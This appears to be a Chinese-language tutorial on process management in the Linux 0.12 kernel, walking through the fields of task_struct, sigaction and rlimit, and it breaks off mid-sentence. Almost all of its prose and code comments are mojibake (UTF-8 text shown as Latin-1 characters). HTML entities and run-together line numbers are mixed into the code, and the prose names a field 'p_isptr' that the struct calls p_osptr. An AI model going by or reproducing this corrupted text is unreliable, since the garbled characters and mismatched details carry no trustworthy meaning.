æ‰€æœ‰çš„ç°ä»£æ“ä½œç³»ç»Ÿéƒ½èƒ½å¤ŸåŒæ—¶è¿è¡Œå¾ˆå¤šä¸ªè¿›ç¨‹ï¼Œå®é™…ä¸Šç³»ç»Ÿä¸­ä¹Ÿä»…æœ‰ä¸€ä¸ªå¤„ç†å™¨ï¼Œé‚£ä¹ˆåœ¨ä¸€ä¸ªæ—¶é—´ç‚¹å®é™…ä¸Šåªæœ‰ä¸€ä¸ªè¿›ç¨‹çœŸæ­£è¿è¡Œåœ¨å¤„ç†å™¨ä¸Šã€‚ä½†æ˜¯æˆ‘ä»¬ç”¨æˆ·åœ¨è®¡ç®—æœºä¸Šæ„Ÿè§‰åˆ°çœŸçš„æ˜¯åŒæ—¶æœ‰å¾ˆå¤šè¿›ç¨‹éƒ½åœ¨è¿è¡Œï¼Œå¹¶ä¸”æ„Ÿè§‰ä¸åˆ°ä»–ä»¬ä¹‹é—´æœ‰ä»€ä¹ˆåˆ‡æ¢å’Œåœæ»ã€‚ é€ æˆè¿™æ ·çš„ç°è±¡ï¼Œå®é™…ä¸Šæ˜¯å› ä¸º Linux å†…æ ¸ä¸å¤„ç†å™¨å»ºç«‹äº†å¤šä»»åŠ¡çš„é”™è§‰ï¼ŒåŒæ—¶è¿è¡Œçš„å¤šä»»åŠ¡å¤„ç†å®é™…ä¸Šæ˜¯æ“ä½œç³»ç»Ÿåœ¨è¿è¡Œæ—¶é€šè¿‡å¿«é€Ÿä»»åŠ¡åˆ‡æ¢å’Œè°ƒåº¦ä½¿å¾—æˆ‘ä»¬æ— æ³•æ„Ÿè§‰åˆ°ä»»åŠ¡æ‰§è¡Œçš„å‰åé¡ºåºã€‚ å¯¹äºæ—©æœŸçš„ Linux 0.12 ç‰ˆæœ¬çš„å†…æ ¸æ¥è¯´ï¼Œæœ€å¤šèƒ½å¤Ÿæ¥å— 64 ä¸ªè¿›ç¨‹çš„åŒæ—¶å­˜åœ¨ã€‚å…¶ä¸­é™¤äº†å†…æ ¸è‡ªå·±å»ºç«‹çš„å¹¶è¿è¡Œèµ·æ¥çš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ä¹‹å¤–ï¼Œå…¶ä»–è¿›ç¨‹éƒ½æ˜¯ç”±ç³»ç»Ÿè°ƒç”¨ fork åˆ›å»ºçš„è¿›ç¨‹ï¼Œè¢«åˆ›å»ºçš„è¿›ç¨‹ç§°ä¸ºå­è¿›ç¨‹ï¼Œåˆ›å»ºè¯¥è¿›ç¨‹çš„è¿›ç¨‹ç§°ä¸ºçˆ¶è¿›ç¨‹ã€‚å†…æ ¸ç¨‹åºä½¿ç”¨è¿›ç¨‹æ ‡è¯†å·( PID ) æ¥æ ‡è®°è¯†åˆ«æ¯ä¸€ä¸ªè¿›ç¨‹ã€‚è¿›ç¨‹ç”±å¯æ‰§è¡Œçš„æŒ‡ä»¤ä»£ç ã€æ•°æ®ä»¥åŠå †æ ˆåŒºç»„æˆã€‚è¿›ç¨‹ä¸­çš„ä»£ç å’Œæ•°æ®éƒ¨åˆ†åˆ†åˆ«å­˜æ”¾åœ¨å¯¹åº”æ‰§è¡Œæ–‡ä»¶çš„ä»£ç æ®µã€æ•°æ®æ®µã€‚æ¯ä¸ªè¿›ç¨‹åªèƒ½æ‰§è¡Œè‡ªå·±çš„ä»£ç å’Œè®¿é—®è‡ªå·±çš„æ•°æ®å’Œå †æ ˆåŒºåŸŸã€‚è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡éœ€è¦é€šè¿‡ç³»ç»Ÿè°ƒç”¨æ¥è¿›è¡Œã€‚å¯¹äºä¸€ä¸ª CPU çš„ç³»ç»Ÿï¼ŒåŒä¸€æ—¶åˆ»ä¹Ÿä»…æœ‰ä¸€ä¸ªè¿›ç¨‹æ­£åœ¨è¿è¡Œã€‚Linux å†…æ ¸é€šè¿‡è°ƒåº¦ç¨‹åºåˆ†æ—¶å¤„ç†å„ä¸ªè¿›ç¨‹è¿è¡Œã€‚ 0x06 Linux ä¸­è¿›ç¨‹è¡¨ä»‹ç» åœ¨ Linux æ“ä½œç³»ç»Ÿä¸­ï¼ŒLinux å†…æ ¸å®é™…ä¸Šé€šè¿‡è¿›ç¨‹è¡¨æ¥å¯¹ç³»ç»Ÿä¸­çš„è¿›ç¨‹è¿›è¡Œç®¡ç†ï¼Œæ¯ä¸ªè¿›ç¨‹åœ¨è¿›ç¨‹è¡¨ä¸­éƒ½å æœ‰ä¸€é¡¹ã€‚åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œè¿›ç¨‹è¡¨å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ª task_struct æ•°æ®ç»“æ„çš„æŒ‡é’ˆã€‚è¿™ä¸ªæ•°ç»“æ„ååˆ†é‡è¦ã€‚ Linux å†…æ ¸ä¸­è®¾è®¡åˆ°è¿›ç¨‹å’Œç¨‹åºçš„æ‰€æœ‰ç®¡ç†å’Œç®—æ³•éƒ½å›´ç»•ç€ä¸€ä¸ªåä¸º task_struct çš„æ•°æ®ç»“æ„å»ºç«‹ï¼Œè¯¥æ•°æ®ç»“æ„çš„å®šä¹‰ä½äº Linux å†…æ ¸ä»£ç ä¸­ include/Linux/sched.h å¤´æ–‡ä»¶ä¸­ã€‚åœ¨å…·ä½“è®²è§£ Linux å¯¹äºè¿›ç¨‹ç®¡ç†ä¹‹å‰å¿…é¡»å…ˆäº†è§£ä¸€ä¸‹è¿™ä¸ªé‡è¦çš„æ•°æ®ç»“æ„ã€‚ task_struct ä¸­åŒ…å«äº†å¾ˆå¤šæ•°æ®æˆå‘˜ï¼Œå…·ä½“ä»£ç å®šä¹‰å†…å®¹å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566/* ä»»åŠ¡(è¿›ç¨‹)æ•°æ®ç»“æ„ï¼Œæˆ–ç§°ä¸ºè¿›ç¨‹æè¿°ç¬¦ */struct task_struct &#123;/* these are hardcoded - don&#x27;t touch *//* ç¡¬ç¼–ç å­—æ®µ */ long state; /* -1 unrunnable, 0 runnable, &gt;0 stopped */ /* ä»»åŠ¡è¿è¡ŒçŠ¶æ€ -1 ä¸å¯è¿è¡Œï¼Œ0 å¯è¿è¡Œ(å°±ç»ª)ï¼Œ &gt;0 å·²åœæ­¢ */ long counter; /* ä»»åŠ¡è¿è¡Œæ—¶é—´è®¡æ•°(é€’å‡)(æ»´ç­”æ•°)ï¼Œè¿è¡Œæ—¶é—´ç‰‡ */ long priority; /* ä¼˜å…ˆçº§ */ long signal; /* ä¿¡å·ä½å›¾ */ struct sigaction sigaction[32]; /* ä¿¡å·æ‰§è¡Œå±æ€§ç»“æ„,å¯¹åº”ä¿¡å·å°†è¦æ‰§è¡Œçš„æ“ä½œå’Œæ ‡å¿—ä¿¡æ¯ */ long blocked; /* è¿›ç¨‹ä¿¡å·å±è”½ç (å¯¹åº”ä¿¡å·ä½å›¾) */ /* bitmap of masked signals *//* various fields *//* å¯å˜å­—æ®µ */ int exit_code; /* é€€å‡ºç  */ unsigned long start_code; /* ä»£ç æ®µåœ°å€ */ unsigned long end_code; /* ä»£ç æ®µé•¿åº¦ï¼ˆå­—èŠ‚æ•°ï¼‰ */ unsigned long end_data; /* ä»£ç æ®µåŠ æ•°æ®æ®µçš„é•¿åº¦ ï¼ˆå­—èŠ‚æ•°ï¼‰*/ unsigned long brk; /* æ€»é•¿åº¦(å­—èŠ‚æ•°) */ unsigned long start_stack; /* å †æ ˆæ®µåœ°å€ */ long pid; /* è¿›ç¨‹æ ‡è¯†å·(è¿›ç¨‹å·) */ long pgrp; /* è¿›ç¨‹ç»„å· */ long session; /* ä¼šè¯å· */ long leader; /* ä¼šè¯é¦–é¢† */ int groups[NGROUPS]; /* è¿›ç¨‹æ‰€å±ç»„å·ï¼ˆä¸€ä¸ªè¿›ç¨‹å¯å±äºå¤šä¸ªç»„ï¼‰ */ /* * pointers to parent process, youngest child, younger sibling, * older sibling, respectively. (p-&gt;father can be replaced with * p-&gt;p_pptr-&gt;pid) */ struct task_struct *p_pptr; /* æŒ‡å‘çˆ¶è¿›ç¨‹çš„æŒ‡é’ˆ */ struct task_struct *p_cptr; /* æŒ‡å‘æœ€æ–°å­è¿›ç¨‹çš„æŒ‡é’ˆ */ struct task_struct *p_ysptr; /* æŒ‡å‘æ¯”è‡ªå·±ååˆ›å»ºçš„ç›¸é‚»è¿›ç¨‹çš„æŒ‡é’ˆ */ struct task_struct *p_osptr; /* æŒ‡å‘æ¯”è‡ªå·±æ—©åˆ›å»ºçš„ç›¸é‚»è¿›ç¨‹çš„æŒ‡é’ˆ */ unsigned short uid; /* ç”¨æˆ·id */ unsigned short euid; /* æœ‰æ•ˆç”¨æˆ·id */ unsigned short suid; /* ä¿å­˜çš„è®¾ç½®ç”¨æˆ·id */ unsigned short gid; /* ç»„id */ unsigned short egid; /* æœ‰æ•ˆç»„id */ unsigned short sgid; /* ä¿å­˜çš„è®¾ç½®ç»„id */ unsigned long timeout; /* å†…æ ¸å®šæ—¶è¶…æ—¶å€¼ */ unsigned long alarm; /* æŠ¥è­¦å®šæ—¶å€¼(æ»´ç­”æ•°) */ long utime; /* ç”¨æˆ·æ€è¿è¡Œæ—¶é—´(æ»´ç­”æ•°) */ long stime; /* å†…æ ¸æ€è¿è¡Œæ—¶é—´(æ»´ç­”æ•°) */ long cutime; /* å­è¿›ç¨‹ç”¨æˆ·æ€è¿è¡Œæ—¶é—´ */ long cstime; /* å­è¿›ç¨‹å†…æ ¸æ€è¿è¡Œæ—¶é—´ */ long start_time; /* è¿›ç¨‹å¼€å§‹è¿è¡Œæ—¶åˆ» */ struct rlimit rlim[RLIM_NLIMITS]; /* è¿›ç¨‹èµ„æºä½¿ç”¨ç»Ÿè®¡æ•°ç»„ */ unsigned int flags; /* per process flags, defined below */ /* å„è¿›ç¨‹çš„æ ‡å¿— */ unsigned short used_math; /* æ˜¯å¦ä½¿ç”¨äº†åå¤„ç†å™¨çš„æ ‡å¿— *//* file system info */ int tty; /* -1 if no tty, so it must be signed */ /* è¿›ç¨‹ä½¿ç”¨ttyç»ˆç«¯çš„å­è®¾å¤‡å·ã€‚-1è¡¨ç¤ºæ²¡æœ‰ä½¿ç”¨ */ unsigned short umask; /* æ–‡ä»¶åˆ›å»ºå±æ€§å±è”½ä½ */ struct m_inode * pwd; /* å½“å‰å·¥ä½œç›®å½•ièŠ‚ç‚¹ç»“æ„æŒ‡é’ˆ */ struct m_inode * root; /* æ ¹ç›®å½•ièŠ‚ç‚¹ç»“æ„æŒ‡é’ˆ */ struct m_inode * executable; /* æ‰§è¡Œæ–‡ä»¶ièŠ‚ç‚¹ç»“æ„æŒ‡é’ˆ */ struct m_inode * library; /* è¢«åŠ è½½åº“æ–‡ä»¶ièŠ‚ç‚¹ç»“æ„æŒ‡é’ˆ */ unsigned long close_on_exec; /* æ‰§è¡Œæ—¶å…³é—­æ–‡ä»¶å¥æŸ„ä½å›¾æ ‡å¿— */ struct file * filp[NR_OPEN]; /* æ–‡ä»¶ç»“æ„æŒ‡é’ˆè¡¨ï¼Œæœ€å¤š32é¡¹ã€‚è¡¨é¡¹å·å³æ˜¯æ–‡ä»¶æè¿°ç¬¦çš„å€¼ *//* ldt for this task 0 - zero 1 - cs 2 - ds&amp;ss */ struct desc_struct ldt[3]; /* å±€éƒ¨æè¿°ç¬¦è¡¨, 0 - ç©ºï¼Œ1 - ä»£ç æ®µcsï¼Œ2 - æ•°æ®å’Œå †æ ˆæ®µds&amp;ss *//* tss for this task */ struct tss_struct tss; /* è¿›ç¨‹çš„ä»»åŠ¡çŠ¶æ€æ®µä¿¡æ¯ç»“æ„ */&#125;; å¯¹äºæ•°æ®é‡è¿™ä¹ˆåºå¤§ã€å¦‚æ­¤å¤æ‚çš„æ•°æ®ç»“æ„ï¼ŒçŸ­æ—¶é—´å†…å¼„æ¸…æ¥šæ˜¯å¾ˆå›°éš¾çš„ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªç»“æ„ä¸­çš„å†…å®¹åˆ†ä¸ºå‡ ä¸ªéƒ¨åˆ†æ¥é€ä¸ªç†è§£å¼„æ¸…æ¥šã€‚è™½ç„¶æ•°æ®ç»“æ„å†…æ•°æ®é‡å·¨å¤§ï¼Œä½†æ˜¯ä¸»è¦å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ éƒ¨åˆ†è¿›è¡Œç†è§£ï¼š è¡¨ç¤ºè¿›ç¨‹çŠ¶æ€å’Œæ‰§è¡Œä¿¡æ¯ï¼Œå¾…å†³ä¿¡å·ã€ä½¿ç”¨çš„äºŒè¿›åˆ¶æ ¼å¼ã€è¿›ç¨‹ ID ï¼ˆPIDï¼‰ã€çˆ¶è¿›ç¨‹åŠå…¶ä»–ç›¸å…³è¿›ç¨‹çš„æŒ‡é’ˆã€ä¼˜å…ˆçº§ä»¥åŠç¨‹åºæ‰§è¡Œ æœ‰å…³å·²ç»åˆ†é…çš„è™šæ‹Ÿå†…å­˜çš„ä¿¡æ¯ã€‚ è¿›ç¨‹èº«ä»½æˆ–è€…æƒé™ï¼Œç”¨æˆ· ID ã€ç»„ ID ç­‰ç­‰ã€‚ ä½¿ç”¨çš„æ–‡ä»¶åŒ…å«ç¨‹åºä»£ç çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€ä»¥åŠè¿›ç¨‹æ‰€å¤„ç†çš„æ‰€æœ‰æ–‡ä»¶çš„æ–‡ä»¶ç³»ç»Ÿä¿¡æ¯ã€‚ çº¿ç¨‹ä¿¡æ¯è®°å½•è¯¥è¿›ç¨‹ç‰¹å®šäº CPU çš„è¿è¡Œæ—¶é—´æ•°æ®ã€‚ åœ¨äºå…¶ä»–åº”ç”¨ç¨‹åºåä½œæ—¶æ‰€éœ€çš„è¿›ç¨‹é—´é€šä¿¡æœ‰å…³çš„ä¿¡æ¯ã€‚ è¯¥è¿›ç¨‹æ‰€ç”¨åˆ°çš„ä¿¡å·å¤„ç†ç¨‹åºï¼Œç”¨äºå“åº”åˆ°æ¥çš„ä¿¡å·ã€‚ ä¸‹é¢ï¼Œå…ˆå°†å…¶ä¸­é‡è¦çš„å‡ ä¸ªæˆå‘˜å˜é‡è¿›è¡Œè®²è§£è¯´æ˜ã€‚ state task_struct ç»“æ„ä¸­çš„ state æˆå‘˜å˜é‡è¡¨ç¤ºçš„å°±æ˜¯è¯¥è¿›ç¨‹å½“å‰çš„çŠ¶æ€ï¼Œåœ¨ Linux å†…æ ¸ä¸­ï¼Œè¿›ç¨‹ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‡ ç§çŠ¶æ€ï¼š TASK_RUNNING ï¼šè¡¨ç¤ºè¿›ç¨‹å¤„äºå¯è¿è¡ŒçŠ¶æ€ã€‚ä½†æ˜¯å¯è¿è¡ŒçŠ¶æ€å¹¶ä¸æ„å‘³ç€å®é™…åˆ†é…äº† CPU èµ„æºã€‚è¿™æ ·çš„çŠ¶æ€å…¶å®å¯¹åº”çš„å°±æ˜¯è¿›ç¨‹çš„å°±ç»ªçŠ¶æ€ï¼Œæ„å‘³ç€å½“ç³»ç»Ÿè°ƒåº¦å™¨é€‰ä¸­è¯¥è¿›ç¨‹æ—¶èƒ½å¤Ÿç«‹åˆ»æ‰§è¡Œå®ƒã€‚ TASK_INTERRUPTIBLE ï¼šè¯¥çŠ¶æ€æ˜¯é’ˆå¯¹ç­‰å¾…æŸä¸ªäº‹ä»¶æˆ–å…¶ä»–èµ„æºçš„ç¡çœ è¿›ç¨‹è®¾ç½®çš„ã€‚å¤„äºè¿™ç§çŠ¶æ€ä¸‹çš„è¿›ç¨‹åœ¨å¾—åˆ°å†…æ ¸å¯¹äºä¿¡å·åä¼šç«‹åˆ»å°†çŠ¶æ€æ”¹å˜æˆ TASK_RUNNING çŠ¶æ€ä»¥æ¢å¤æ­£å¸¸è¿è¡Œã€‚ TASK_UNINTERRUPTIBLE ï¼šè¿™ç§çŠ¶æ€è¡¨ç¤ºæ˜¯æ¥æ”¶åˆ°å†…æ ¸æŒ‡ç¤ºè€Œåœç”¨çš„ç¡çœ è¿›ç¨‹ã€‚è¿™æ ·çš„è¿›ç¨‹ä¸èƒ½å¤Ÿç”±å¤–éƒ¨ä¿¡å·å”¤é†’ï¼Œåªèƒ½ç”±å†…æ ¸äº²è‡ªå”¤é†’ã€‚ TASK_STOPPED ï¼šè¯¥çŠ¶æ€è¡¨ç¤ºè¿›ç¨‹ç‰¹æ„åœæ­¢è¿è¡Œï¼Œä¾‹å¦‚ï¼šç”±è°ƒåº¦å™¨æŒ‡ç¤ºè€Œæš‚åœçš„è¿›ç¨‹ã€‚ TASK_TRACED ï¼šè¿™ç§çŠ¶æ€å®é™…ä¸Šå¹¶ä¸æ˜¯æœ‰è¿›ç¨‹æœ¬èº«è¿è¡Œè¿‡ç¨‹ä¸­å‡ºç°çš„ï¼Œæ˜¯å½“è¿›ç¨‹å¤„äºè¢«è°ƒè¯•çš„æ—¶å€™ç”¨æ¥ä¸å¸¸è§„è¿›ç¨‹åŒºåˆ†è€Œè®¾è®¡çš„è¿›ç¨‹çŠ¶æ€ã€‚ counter å­—æ®µ counter ä¸»è¦ç”¨æ¥ä¿å­˜è¿›ç¨‹åœ¨æš‚æ—¶åœæ­¢æœ¬æ¬¡è¿è¡Œä¹‹å‰è¿˜èƒ½å¤Ÿæ‰§è¡Œçš„æ—¶é—´æ»´ç­”æ•°ï¼Œå³åœ¨æ­£å¸¸æƒ…å†µä¸‹è¿˜éœ€è¦ç»è¿‡å¤šå°‘ä¸ªç³»ç»Ÿæ—¶é’Ÿå‘¨æœŸæ‰ä¼šåˆ‡æ¢åˆ°å¦ä¸€ä¸ªè¿›ç¨‹ã€‚è°ƒåº¦ç¨‹åºä¼šä½¿ç”¨è¿›ç¨‹çš„è¯¥æˆå‘˜å€¼æ¥é€‰æ‹©ä¸‹ä¸€ä¸ªè¦æ‰§è¡Œçš„è¿›ç¨‹ã€‚å› æ­¤ï¼Œ counter å¯ä»¥çœ‹åšæ˜¯ä¸€ä¸ªè¿›ç¨‹çš„åŠ¨æ€ç‰¹æ€§ã€‚åœ¨ä¸€ä¸ªè¿›ç¨‹åˆšè¢«åˆ›å»ºæ—¶ï¼Œcounter çš„åˆå§‹å€¼ä¸º priorityã€‚ priority ç»“åˆå‰é¢å¯¹ counter çš„æè¿°ï¼Œpriority çš„ä½œç”¨å°±æ˜¯ä¸ºäº†ç»™ counter èµ‹å€¼ã€‚åœ¨ Linux 0.12 ç‰ˆæœ¬ä¸­è¿™ä¸ªåˆå€¼è®¾å®šä¸º 15 ï¼Œè¡¨ç¤ºè®¾å®šåˆå§‹å€¼ä¸º 15 ä¸ªæ—¶é—´æ»´ç­”æ•°ã€‚ signal signal å­—æ®µè¡¨ç¤ºè¿›ç¨‹å½“å‰æ¥æ”¶åˆ°ä¿¡å·çš„ä½å›¾ï¼Œæ€»å…± 32 ä½ï¼Œæ¯ä¸€ä½ä»£è¡¨ä¸€ç§ç³»ç»Ÿä¿¡å·ç±»å‹ã€‚å› æ­¤ï¼ŒLinux å†…æ ¸ä¸­æœ€å¤šä¹Ÿä»…æœ‰ 32 ç§ä¿¡å·ã€‚åœ¨æ¯ä¸ªç³»ç»Ÿè°ƒç”¨å¤„ç†åï¼Œç³»ç»Ÿä¼šä½¿ç”¨è¯¥ä¿¡å·ä½å›¾å¯¹ä¿¡å·è¿›è¡Œé¢„å¤„ç†ã€‚ sigaction æ•°ç»„ è¯¥æ•°å€¼ç±»å‹ä¸º struct sigaction ï¼Œè¯¥ç»“æ„æ•°ç»„ç”¨æ¥ä¿å­˜å¤„ç†å„ä¸ªä¿¡å·æ‰€ç”¨çš„æ“ä½œå’Œå±æ€§ï¼Œæ•°ç»„æ¯ä¸€é¡¹å¯¹åº”ä¸€ä¸ªä¿¡å·ã€‚å…·ä½“ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š 123456struct sigaction &#123; void (*sa_handler)(int); /* å¯¹åº”æŸä¿¡å·æŒ‡å®šè¦é‡‡å–çš„è¡ŒåŠ¨ */ sigset_t sa_mask; /* å¯¹ä¿¡å·çš„å±è”½ç ï¼Œåœ¨ä¿¡å·ç¨‹åºæ‰§è¡Œæ—¶å°†é˜»å¡å¯¹è¿™äº›ä¿¡å·çš„å¤„ç† */ int sa_flags; /* æ”¹å˜ä¿¡å·å¤„ç†è¿‡ç¨‹çš„ä¿¡å·é›† */ void (*sa_restorer)(void);/* æ¢å¤å‡½æ•°æŒ‡é’ˆï¼Œç”±å‡½æ•°åº“Libcæä¾›ï¼Œç”¨äºæ¸…ç†ç”¨æˆ·æ€å †æ ˆ */&#125;; blocked è¯¥å­—æ®µè¡¨ç¤ºè¿›ç¨‹å½“å‰ä¸æƒ³è¦å¤„ç†çš„ä¿¡å·çš„é˜»å¡ä½å›¾ã€‚ä¸ signal å­—æ®µç±»ä¼¼ï¼Œæ¯ä¸€ä½è¡¨ç¤ºä¸€ç§å¯¹åº”è¢«é˜»å¡çš„ä¿¡å·ã€‚ exit è¿™ä¸€å­—æ®µç”¨æ¥ä¿å­˜ç¨‹åºç»ˆæ­¢æ—¶çš„é€€å‡ºç ã€‚åœ¨å­è¿›ç¨‹ç»“æŸåçˆ¶è¿›ç¨‹èƒ½å¤ŸæŸ¥è¯¢å­è¿›ç¨‹çš„è¿™ä¸ªé€€å‡ºç ã€‚ start_code è¯¥å­—æ®µç”¨æ¥ä¿å­˜è¿›ç¨‹ä»£ç åœ¨ CPU çº¿æ€§åœ°å€ç©ºé—´ä¸­çš„å¼€å§‹åœ°å€ï¼Œåœ¨ Linux 0.12 å†…æ ¸ä¸­è¿™ä¸ªæ•°å€¼æ˜¯ 64 MB çš„æ•´æ•°å€ã€‚ end_code è¯¥å­—æ®µä¿å­˜ç€è¿›ç¨‹ä»£ç çš„å­—èŠ‚é•¿åº¦å€¼ã€‚ end_data è¯¥å­—æ®µä¿å­˜è¿›ç¨‹çš„ä»£ç ç¨‹åº¦ + æ•°æ®é•¿åº¦çš„æ€»å­—èŠ‚é•¿åº¦å€¼ã€‚ brk è¿™ä¸ªå­—æ®µä¹Ÿæ˜¯è¿›ç¨‹ä»£ç å’Œæ•°æ®çš„æ€»å­—èŠ‚é•¿åº¦ï¼ˆæŒ‡é’ˆå€¼ï¼‰ï¼Œä½†æ˜¯è¿˜åŒ…æ‹¬æœªåˆå§‹åŒ–çš„æ•°æ®åŒº BSS ã€‚è¿™æ˜¯ brk åœ¨ä¸€ä¸ªè¿›ç¨‹å¼€å§‹æ‰§è¡Œçš„åˆå§‹å€¼ã€‚é€šè¿‡ä¿®æ”¹è¿™ä¸ªæŒ‡é’ˆçš„æ•°å€¼ï¼Œå†…æ ¸å¯ä»¥ä¸ºè¿›ç¨‹æ·»åŠ å’Œé‡Šæ”¾åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼ˆé€šå¸¸é€šè¿‡è°ƒç”¨ malloc å‡½æ•°æ¥è°ƒç”¨ brk ç³»ç»Ÿè°ƒç”¨å®ç°ï¼‰ã€‚ start_stack è¯¥å­—æ®µæŒ‡å‘è¿›ç¨‹é€»è¾‘åœ°å€ç©ºé—´ä¸­å †æ ˆçš„èµ·å§‹å¤„ã€‚ pid é¡¾åæ€ä¹‰ï¼Œä¿å­˜è¿›ç¨‹æ ‡è¯†å·ï¼Œç”¨æ¥å”¯ä¸€è¡¨ç¤ºè¿›ç¨‹ã€‚ pgrp æŒ‡è¿›ç¨‹æ‰€å±è¿›ç¨‹ç»„å· session è¿›ç¨‹çš„ä¼šè¯å·ï¼Œæ‰€å±ä¼šè¯çš„è¿›ç¨‹å· leader è¿›ç¨‹æ‰€å±ä¼šè¯çš„é¦–è¿›ç¨‹å·ã€‚ group[NGROUPS] è¿›ç¨‹æ‰€å±å„ä¸ªç»„çš„ç»„å·æ•°ç»„ï¼Œä¸€ä¸ªè¿›ç¨‹å¯ä»¥å±äºå¤šä¸ªç»„ p_pptr ã€ p_cptr ã€ p_ysptr ã€ p_isptr è¿™å‡ ä¸ªå­—æ®µå‡ä¸º task_struct æ•°æ®ç»“æ„æŒ‡é’ˆã€‚å…¶ä¸­ï¼š p_pptr æ˜¯æŒ‡å‘çˆ¶è¿›ç¨‹ä»»åŠ¡ç»“æ„çš„æŒ‡é’ˆ p_cptr æ˜¯æŒ‡å‘æœ€æ–°å­è¿›ç¨‹ä»»åŠ¡ç»“æ„çš„æŒ‡é’ˆ p_ysptr æ˜¯æŒ‡å‘æ¯”è‡ªå·±ååˆ›å»ºçš„ç›¸é‚»è¿›ç¨‹çš„æŒ‡é’ˆ p_isptr æ˜¯æŒ‡å‘æ¯”è‡ªå·±æ—©åˆ›å»ºçš„ç›¸é‚»è¿›ç¨‹çš„æŒ‡é’ˆ ä»¥ä¸Šè¿™å››ä¸ªæŒ‡é’ˆçš„å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œé€šè¿‡è¿™æ ·çš„æˆå‘˜æŒ‡é’ˆæ•°æ®ï¼Œå†…æ ¸å¾ˆå®¹æ˜“å°±èƒ½é€šè¿‡ä¸€ä¸ªè¿›ç¨‹çš„ä»»åŠ¡ç»“æ„è·å–åˆ°å…¶ä»–ä¸è¿™ä¸ªè¿›ç¨‹æœ‰å…³ç³»çš„è¿›ç¨‹çš„ä»»åŠ¡ç»“æ„å¯¹è±¡ã€‚ uid ã€ euid ã€ suid ã€ gid ã€ egid ã€ sgid è¿™å‡ ä¸ªæˆå‘˜å­—æ®µéƒ½å±äºè¿›ç¨‹ç”¨æˆ·ç›¸å…³æ ‡è¯†å·ï¼Œå…¶ä¸­ï¼š uidï¼šä¿å­˜æ‹¥æœ‰è¿™ä¸ªè¿›ç¨‹çš„ç”¨æˆ·æ ‡è¯†å·ï¼ˆç”¨æˆ· ID ï¼‰ euidï¼šæœ‰æ•ˆç”¨æˆ·æ ‡è¯†å·ï¼Œè¡¨ç¤ºè®¿é—®æ–‡ä»¶çš„æƒé™ suid ï¼šæ–‡ä»¶ä¿å­˜çš„ç”¨æˆ·æ ‡è¯†å·ï¼Œå½“æ‰§è¡Œæ–‡ä»¶çš„è®¾ç½®ç”¨æˆ· ID æ ‡å¿—ç½®ä¸€æ—¶ï¼Œ suid ä¸­æŠŠä¿å­˜æ‰§è¡Œæ–‡ä»¶çš„ uid ï¼Œå¦åˆ™ä¿å­˜è¿›ç¨‹çš„ euid gid ï¼šæŒ‡ç”¨æˆ·æ‰€å±çš„ç»„æ ‡è¯†å·ï¼ˆç»„ ID ï¼‰ï¼ŒæŒ‡æ˜äº†ç”¨äºè¯¥è¿›ç¨‹çš„ç”¨æˆ·ç»„ egid ï¼šæœ‰æ•ˆç»„ ID ï¼Œç”¨äºæŒ‡æ˜è¯¥ç»„ç”¨æˆ·è®¿é—®æ–‡ä»¶çš„æƒé™ sgid ï¼šä¿å­˜çš„ç”¨æˆ· ID ï¼Œå½“æ‰§è¡Œæ–‡ä»¶çš„è®¾ç½®ç»„ ID æ ‡å¿—ç½®ä¸€æ—¶ï¼Œsgid ä¸­ä¿å­˜æ‰§è¡Œæ–‡ä»¶çš„ gid ï¼›å¦åˆ™ï¼Œä¿å­˜è¿›ç¨‹çš„ egid ã€‚ timeout è®°å½•å†…æ ¸å®šæ—¶è¶…æ—¶çš„å€¼ã€‚ alarm ç”¨äºè¿›ç¨‹çš„æŠ¥è­¦å®šæ—¶å€¼ã€‚å¦‚æœè¿›ç¨‹ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨ alarm() è®¾ç½®è¿‡è¯¥å­—æ®µï¼Œåˆ™å†…æ ¸ä¼šæŠŠè¯¥å‡½æ•°ä»¥ç§’ä¸ºå•ä½çš„å‚æ•°è½¬æ¢æˆæ»´ç­”å€¼å­˜æ”¾åˆ°è¿™ä¸ªå­—æ®µä¸­ï¼Œ rlim æ•°ç»„ rlim æ•°ç»„æˆå‘˜ä¸»è¦ä½œä¸º Linux æä¾›èµ„æºé™åˆ¶çš„å‚æ•°ï¼Œè¯¥æ•°ç»„æˆå‘˜ç±»å‹ä¸º struct rlimit ï¼Œå…·ä½“å¦‚ä¸‹ï¼š 1234struct rlimit &#123; int rlim_cur; int rlim_max;&#125;; å…·ä½“ç±»å‹ä¸­ï¼š rlim_cur ï¼šè¡¨ç¤ºè¿›ç¨‹å½“å‰çš„èµ„æºé™åˆ¶ï¼Œä¹Ÿç§°ä¸ºè½¯ä»¶é™åˆ¶ã€‚ rlim_max ï¼šè¡¨ç¤ºè¿›ç¨‹å½“å‰æœ€å¤§å¯å…è®¸çš„é™åˆ¶èŒƒå›´ï¼Œç§°ä¸ºç¡¬ä»¶é™åˆ¶ã€‚ æ“ä½œç³»ç»Ÿèƒ½å¤Ÿè°ƒç”¨ setrlimit() å‡½æ•°æ¥å¢å‡å½“å‰çš„èµ„æºé™åˆ¶å…·ä½“æ•°å€¼ï¼Œä½†æ˜¯ä¾æ—§ä¸èƒ½å¤Ÿè¶…è¿‡ rlim_max æŒ‡å®šçš„å€¼ã€‚å¯¹åº”çš„ï¼Œgetrlimits() èƒ½å¤Ÿç”¨æ¥æ£€æŸ¥å½“å‰é™åˆ¶çš„å…·ä½“æ•°å€¼ã€‚ åœ¨å†…æ ¸ä¸­ï¼Œå¯¹äº rlim å˜é‡çš„æ•°ç»„ä½ç½®æ˜¯ä¸èµ„æºç±»å‹ç›¸å…³çš„ï¼Œè¿™æ˜¯ Linux å†…æ ¸ä¸­é¢„å®šä¹‰çš„å¸¸æ•°ï¼Œåœ¨ Linux 0.12 ç‰ˆæœ¬ä¸­è¿˜ä»…æœ‰ 6 